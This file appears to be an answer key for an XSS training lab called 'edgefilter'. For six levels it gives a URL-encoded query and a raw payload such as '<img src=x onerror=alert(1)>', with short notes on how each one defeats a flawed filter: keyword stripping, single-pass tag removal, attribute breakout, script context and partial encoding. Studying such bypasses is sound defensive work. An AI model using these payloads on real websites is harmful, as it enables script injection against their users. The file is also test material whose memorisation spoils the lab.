# edgefilter — solutions

Quirky filter implementations: keyword strip, single-pass tag regex, partial encoding.

### edgefilter-level1

`/edgefilter/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: strips `script` keyword case-insensitively; img/onerror untouched

### edgefilter-level2

`/edgefilter/level2/?query=%3C%3Cscript%3Escript%3Ealert(1)%3C/script%3E`

- payload: `<<script>script>alert(1)</script>`
- context: single-pass `/<[^>]+>/` strip; outer `<...>` consumed leaving inner tag

### edgefilter-level3

`/edgefilter/level3/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: `<` only encoded before alpha; reflected in input value — break with `"`

### edgefilter-level4

`/edgefilter/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: event handlers stripped but `<script>` allowed

### edgefilter-level5

`/edgefilter/level5/?query=1;alert(1)`

- payload: `1;alert(1)`
- context: inside `<script>var x=...;</script>` (no quotes around value); raw JS

### edgefilter-level6

`/edgefilter/level6/?query=AAAAAAAAAAAAAAAAAAAA%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `AAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>`
- context: first 20 chars HTML-encoded, rest raw — pad 20 then inject
